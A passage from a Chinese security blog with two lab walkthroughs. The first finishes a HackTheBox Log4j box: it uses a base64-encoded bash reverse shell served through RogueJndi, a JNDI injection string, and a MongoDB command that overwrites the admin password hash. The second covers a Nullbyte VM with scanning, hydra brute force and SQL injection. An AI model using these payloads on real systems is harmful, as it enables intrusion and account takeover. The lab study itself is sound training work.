class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/startpoint/Log4jUnifi/utils]<br>└─$ java -jar rogue-jndi/target/RogueJndi-1.1.jar --<span class="hljs-built_in">command</span> <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTA5LzQ0NDQgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> --hostname <span class="hljs-string">&quot;10.10.14.109&quot;</span><br>+-+-+-+-+-+-+-+-+-+<br>|R|o|g|u|e|J|n|d|i|<br>+-+-+-+-+-+-+-+-+-+<br>Starting HTTP server on 0.0.0.0:8000<br>Starting LDAP server on 0.0.0.0:1389<br>Mapping ldap://10.10.14.109:1389/o=websphere1 to artsploit.controllers.WebSphere1<br>Mapping ldap://10.10.14.109:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1<br>Mapping ldap://10.10.14.109:1389/o=websphere2 to artsploit.controllers.WebSphere2<br>Mapping ldap://10.10.14.109:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2<br>Mapping ldap://10.10.14.109:1389/o=tomcat to artsploit.controllers.Tomcat<br>Mapping ldap://10.10.14.109:1389/o=groovy to artsploit.controllers.Groovy<br>Mapping ldap://10.10.14.109:1389/ to artsploit.controllers.RemoteReference<br>Mapping ldap://10.10.14.109:1389/o=reference to artsploit.controllers.RemoteReference<br><br></code></pre></td></tr></table></figure><p>开启后，我们同时使用 nc 监听对应端口，之后借助于 burp 软件来捕获登录的 POST 请求，将 <code>$&#123;jndi:ldap://&#123;Your Tun0 IP&#125;:1389/o=tomcat&#125;</code> 写入 remember 中，再发送。攻击机的服务中会提示以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Sending LDAP ResourceRef result <span class="hljs-keyword">for</span> o=tomcat with javax.el.ELProcessor payload<br></code></pre></td></tr></table></figure><p>回过头看 nc 监听的端口，收到了连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [10.10.14.109] from (UNKNOWN) [10.129.47.12] 38170<br><span class="hljs-built_in">whoami</span><br>unifi<br><span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">which</span> python3<br><span class="hljs-built_in">which</span> python2<br><span class="hljs-built_in">which</span> <span class="hljs-built_in">ls</span><br>/bin/ls<br>script /dev/null -c bash<br>Script started, file is /dev/null<br>unifi@unified:/usr/lib/unifi$<br></code></pre></td></tr></table></figure><p>由于没有 python 环境，一下子不是很习惯，看了一眼 WP，使用了 <code>script /dev/null -c bash</code></p><h3 id="getshell-后的信息收集-1"><a href="#getshell-后的信息收集-1" class="headerlink" title="getshell 后的信息收集"></a>getshell 后的信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">unifi@unified:/usr/lib/unifi/data/db$ <span class="hljs-built_in">cd</span> ../backup<br><span class="hljs-built_in">cd</span> ../backup<br>unifi@unified:/usr/lib/unifi/data/backup$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>6.4.54.unf  autobackup  meta.json<br>unifi@unified:/usr/lib/unifi/data/backup$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 24K<br>43513 drwxr-xr-x 3 unifi unifi 4.0K Jan  2  2022 .<br>37973 drwxr-xr-x 4 unifi unifi 4.0K Jun  6 08:23 ..<br>37705 -rw-r--r-- 1 unifi unifi 7.7K Dec 31  2021 6.4.54.unf<br>43518 drwxr-xr-x 2 unifi unifi 4.0K Jan  2  2022 autobackup<br>37892 -rw-r--r-- 1 unifi unifi  123 Dec 31  2021 meta.json<br>unifi@unified:/usr/lib/unifi/data/backup$ <span class="hljs-built_in">cat</span> meta.json<br><span class="hljs-built_in">cat</span> meta.json<br>&#123;<span class="hljs-string">&quot;6.4.54&quot;</span>:&#123;<span class="hljs-string">&quot;version&quot;</span>:<span class="hljs-string">&quot;6.4.54&quot;</span>,<span class="hljs-string">&quot;time&quot;</span>:1640911998680,<span class="hljs-string">&quot;datetime&quot;</span>:<span class="hljs-string">&quot;2021-12-31T00:53:18Z&quot;</span>,<span class="hljs-string">&quot;format&quot;</span>:<span class="hljs-string">&quot;bson&quot;</span>,<span class="hljs-string">&quot;days&quot;</span>:0,<span class="hljs-string">&quot;size&quot;</span>:7824&#125;&#125;unifi@unified:/usr/lib/unifi/data/backup$ <span class="hljs-built_in">cd</span> autobackup<br><span class="hljs-built_in">cd</span> autobackup<br>unifi@unified:/usr/lib/unifi/data/backup/autobackup$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>unifi@unified:/usr/lib/unifi/data/backup/autobackup$ <span class="hljs-built_in">cd</span> /<br><span class="hljs-built_in">cd</span> /<br>unifi@unified:/$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>bin   dev  home  lib64  mnt  proc  run   srv  tmp    usr<br>boot  etc  lib   media  opt  root  sbin  sys  unifi  var<br>unifi@unified:/$ <span class="hljs-built_in">cd</span> /home<br><span class="hljs-built_in">cd</span> /home<br>unifi@unified:/home$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>michael<br>unifi@unified:/home$ <span class="hljs-built_in">cd</span> michael<br><span class="hljs-built_in">cd</span> michael<br>unifi@unified:/home/michael$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>unifi@unified:/home/michael$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>6ced1a6a89e666c0620cdb10262ba127<br><br></code></pre></td></tr></table></figure><p>ps 命令查看进程信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">unifi@unified:/home/michael$ ps aux<br>ps aux<br>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>unifi          1  0.0  0.0   1080     4 ?        Ss   08:23   0:00 /sbin/docker-<br>unifi          6  0.0  0.1  18512  3140 ?        S    08:23   0:00 bash /usr/loc<br>unifi         16  1.5 25.4 3670972 518176 ?      Sl   08:23   0:46 java -Dunifi.<br>unifi         66  0.4  4.1 1099648 85388 ?       Sl   08:23   0:13 bin/mongod --<br>unifi       1366  0.0  0.1  18380  2992 ?        S    09:09   0:00 bash -c &#123;<span class="hljs-built_in">echo</span><br>unifi       1370  0.0  0.1  18512  3180 ?        S    09:09   0:00 bash -i<br>unifi       1373  0.0  0.1  18380  3088 ?        S    09:09   0:00 bash<br>unifi       1389  0.0  0.1  19312  2180 ?        S    09:10   0:00 script /dev/n<br>unifi       1390  0.0  0.0   4632   884 pts/0    Ss   09:10   0:00 sh -c bash<br>unifi       1391  0.0  0.1  18512  3416 pts/0    S    09:10   0:00 bash<br>unifi       1460  0.0  0.1  34408  2760 pts/0    R+   09:12   0:00 ps aux<br>unifi@unified:/home/michael$ netstat -nat<br>netstat -nat<br>bash: netstat: <span class="hljs-built_in">command</span> not found<br>unifi@unified:/home/michael$ netstat<br>netstat<br>bash: netstat: <span class="hljs-built_in">command</span> not found<br>unifi@unified:/home/michael$ ps aux | grep mongo<br>ps aux | grep mongo<br>unifi         66  0.4  4.1 1099648 85388 ?       Sl   08:23   0:14 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1<br>unifi       1503  0.0  0.0  11468  1040 pts/0    S+   09:13   0:00 grep mongo<br></code></pre></td></tr></table></figure><p>这里有个小技巧，ps aux 的结果中没有端口信息，而使用 grep 进行过滤后，可以得到某个进程更具体的信息。我们得到了 mongo 的端口号，使用命令行来和 MongoDB 服务进行交互，使用谷歌搜索确定 UniFi 默认数据的名称为 ace，使用以下命令来获得用户和其shadow</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mongo --port 27117 ace --<span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;db.admin.find().forEach(printjson);&quot;</span><br></code></pre></td></tr></table></figure><h3 id="mongo-命令行修改数据库"><a href="#mongo-命令行修改数据库" class="headerlink" title="mongo 命令行修改数据库"></a>mongo 命令行修改数据库</h3><p>这里的哈希值没法爆破出来，但是换个思路，我们可以直接修改 shadow </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ mkpasswd -m sha-512 Password1234<br>$6$iUKnCe31IP2yVcQw<span class="hljs-variable">$h01M94RtVE</span>/dHAnBOMNr.DzK.XlT3gQtjo1xHd2j.g3ZKoS7ryrhi.F27uRON.DTkX/IwnF.dGAfUj5yGYnyd1<br></code></pre></td></tr></table></figure><p>使用 mkpasswd 来获得 sha512 类型的哈希值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --<span class="hljs-built_in">eval</span> <span class="hljs-string">&#x27;db.admin.update(&#123;&quot;_id&quot;:ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;)&#125;,&#123;$set:&#123;&quot;x_shadow&quot;:&quot;$6$iUKnCe31IP2yVcQw$h01M94RtVE/dHAnBOMNr.DzK.XlT3gQtjo1xHd2j.g3ZKoS7ryrhi.F27uRON.DTkX/IwnF.dGAfUj5yGYnyd1&quot;&#125;&#125;)&#x27;</span><br>&lt;.g3ZKoS7ryrhi.F27uRON.DTkX/IwnF.dGAfUj5yGYnyd1<span class="hljs-string">&quot;&#125;&#125;)&#x27;</span><br><span class="hljs-string">MongoDB shell version v3.6.3</span><br><span class="hljs-string">connecting to: mongodb://127.0.0.1:27117/ace</span><br><span class="hljs-string">MongoDB server version: 3.6.3</span><br><span class="hljs-string">WriteResult(&#123; &quot;</span>nMatched<span class="hljs-string">&quot; : 1, &quot;</span>nUpserted<span class="hljs-string">&quot; : 0, &quot;</span>nModified<span class="hljs-string">&quot; : 1 &#125;)</span><br></code></pre></td></tr></table></figure><p>在使用上一个命令查看修改是否成功，确定修改成功后，登录 UniFi</p><p><img src="/pic/ef7fb1ca9f54b918e470c88e157a3a17_MD5.png"></p><p>在 settings 的 site 中，可以开启 ssh 登录授权，直接拿到了用户名和密码</p><p><img src="/pic/31c124c5fcd506c347e314402ec92d59_MD5.png"></p><p>最后 ssh 登录即可拿到 root.txt</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>hackthebox</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nullbyte靶机</title>
    <link href="/2023/05/59d54dfe404f.html"/>
    <url>/2023/05/59d54dfe404f.html</url>
    
    <content type="html"><![CDATA[<h1 id="Nullbyte-靶机"><a href="#Nullbyte-靶机" class="headerlink" title="Nullbyte 靶机"></a>Nullbyte 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.108<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-27 02:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.00022s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>777/tcp   open  multiling-http<br>38157/tcp open  unknown<br>MAC Address: 08:00:27:1C:0D:6F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.04 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p80,111,777,38157 192.168.56.108<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-27 03:01 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.00038s latency).<br><br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-title: Null Byte 00 - level 1<br>|_http-server-header: Apache/2.4.10 (Debian)<br>111/tcp   open  rpcbind 2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          38157/tcp   status<br>|   100024  1          40076/udp   status<br>|   100024  1          53418/tcp6  status<br>|_  100024  1          53583/udp6  status<br>777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)<br>|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)<br>|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)<br>|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)<br>38157/tcp open  status  1 (RPC <span class="hljs-comment">#100024)</span><br>MAC Address: 08:00:27:1C:0D:6F (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.57 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p80,111,777,38157 192.168.56.108 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-27 03:03 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.00026s latency).<br><br>PORT      STATE SERVICE<br>80/tcp    open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /phpmyadmin/: phpMyAdmin</span><br><span class="hljs-string">|_  /uploads/: Potentially interesting folder</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>111/tcp   open  rpcbind<br>777/tcp   open  multiling-http<br>38157/tcp open  unknown<br>MAC Address: 08:00:27:1C:0D:6F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 321.11 seconds<br></code></pre></td></tr></table></figure><h2 id="Web-界面查看"><a href="#Web-界面查看" class="headerlink" title="Web 界面查看"></a>Web 界面查看</h2><p><img src="/pic/d23d5fbf88cbc1c38cf23f700ba3db8b_MD5.png"></p><p>有一张图片，main.gif，源码中没有什么有价值的信息，目录爆破一下吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,zip,html,sql,php -t 64<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.2.0-dev<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.108<br>[+] Method:                  GET<br>[+] Threads:                 64<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.2.0-dev<br>[+] Extensions:              sql,php,txt,zip,html<br>[+] Timeout:                 10s<br>===============================================================<br>2023/05/27 05:11:27 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 294]<br>/uploads              (Status: 301) [Size: 318] [--&gt; http://192.168.56.108/uploads/]<br>/index.html           (Status: 200) [Size: 196]<br>/.php                 (Status: 403) [Size: 293]<br>/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.56.108/javascript/]<br>/phpmyadmin           (Status: 301) [Size: 321] [--&gt; http://192.168.56.108/phpmyadmin/]<br>/.html                (Status: 403) [Size: 294]<br>/.php                 (Status: 403) [Size: 293]<br>/server-status        (Status: 403) [Size: 302]<br>Progress: 1321309 / 1323366 (99.84%)===============================================================<br>2023/05/27 05:15:20 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>看一下 phpmyadmin </p><p><img src="/pic/3873cb73971bde1d7165d36794ddb200_MD5.png"></p><p>尝试弱密码失败，总不能爆破吧……再看看 uploads</p><p><img src="/pic/564c4c0f4c1a237e8d227a9da585d934_MD5.png"></p><p>emmmm 还是没啥思路，看一眼红队笔记，原来是首页图片中包含了隐藏信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ wget http://192.168.56.108/main.gif<br>--2023-05-28 03:43:54--  http://192.168.56.108/main.gif<br>Connecting to 192.168.56.108:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 16647 (16K) [image/gif]<br>Saving to: ‘main.gif’<br><br>main.gif                                                   100%[=======================================================================================================================================&gt;]  16.26K  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2023-05-28 03:43:54 (95.3 MB/s) - ‘main.gif’ saved [16647/16647]<br></code></pre></td></tr></table></figure><p>使用工具查看文件头和基础信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ file main.gif    <br>main.gif: GIF image data, version 89a, 235 x 302<br><br>┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ binwalk main.gif <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>------------------------------------------------------------------------<br>0             0x0             GIF image data, version <span class="hljs-string">&quot;89a&quot;</span>, 235 x 302<br><br>┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ exiftool main.gif <br>ExifTool Version Number         : 12.57<br>File Name                       : main.gif<br>Directory                       : .<br>File Size                       : 17 kB<br>File Modification Date/Time     : 2015:08:01 12:39:30-04:00<br>File Access Date/Time           : 2023:05:28 03:44:10-04:00<br>File Inode Change Date/Time     : 2023:05:28 03:43:54-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : GIF<br>File Type Extension             : gif<br>MIME Type                       : image/gif<br>GIF Version                     : 89a<br>Image Width                     : 235<br>Image Height                    : 302<br>Has Color Map                   : No<br>Color Resolution Depth          : 8<br>Bits Per Pixel                  : 1<br>Background Color                : 0<br>Comment                         : P-): kzMb5nVYJw<br>Image Size                      : 235x302<br>Megapixels                      : 0.071<br></code></pre></td></tr></table></figure><p>得到一串很短的字符，这时候需要发散思维，首先尝试 phpmyadmin 登录，失败。其次尝试是否是 base64 或者其他的加密方式，失败。最后尝试目录，成功</p><p><img src="/pic/910d473098a3ea8fb9062571638cfa57_MD5.png"></p><p>看来是个需要输入密码的地方，看一眼网页源代码</p><p><img src="/pic/f89b32feebdc272bc0662f472bb45ae5_MD5.png"></p><p>应该是可以爆破的，那就尝试 hydra 爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt -s 80 192.168.56.108 http-post-form <span class="hljs-string">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span><br>Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-28 04:01:11<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>[DATA] attacking http-post-form://192.168.56.108:80/kzMb5nVYJw/index.php:key=^PASS^:invalid key<br>[STATUS] 4504.00 tries/min, 4504 tries <span class="hljs-keyword">in</span> 00:01h, 14339895 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 53:04h, 16 active<br>[STATUS] 4088.00 tries/min, 12264 tries <span class="hljs-keyword">in</span> 00:03h, 14332135 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 58:26h, 16 active<br>[80][http-post-form] host: 192.168.56.108   login: root   password: elite<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-28 04:07:27<br></code></pre></td></tr></table></figure><p>成功得到了密码，进入之后发现是个根据用户名查询信息的界面，异常简陋，看起来可能存在 sql 注入，尝试 <code>&#39;</code> 失败，得到如下结果，分别尝试数字和 <code>&#39;</code> 的拼接还是这个界面，</p><p><img src="/pic/c94cc51228028324381d85c043c760f8_MD5.png"></p><p>尝试 <code>&quot;</code> 成功，然后就是手工构造 sql 注入语句的过程</p><p><img src="/pic/eae0e776267506217f8024b4cef154cb_MD5.png"></p><p>联合查询</p><p><img src="/pic/e13059c3d018018df20af0638093e3b2_MD5.png"></p><p>查看数据库名</p><p><img src="/pic/3a2d26af4b5ca61f4309ce8914eb1091_MD5.png"></p><p>查看表名</p><p><img src="/pic/5c7c5275db391de0f2c0871b8eb0fcc6_MD5.png"></p><p>查看列名</p><p><img src="/pic/677942334b57e57092cf330f7f3ebe0b_MD5.png"></p><p>查看内容</p><p><img src="/pic/3e80ad7f581fd4fdabda609b323c2b4d_MD5.png"></p><p>base 64 解密一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 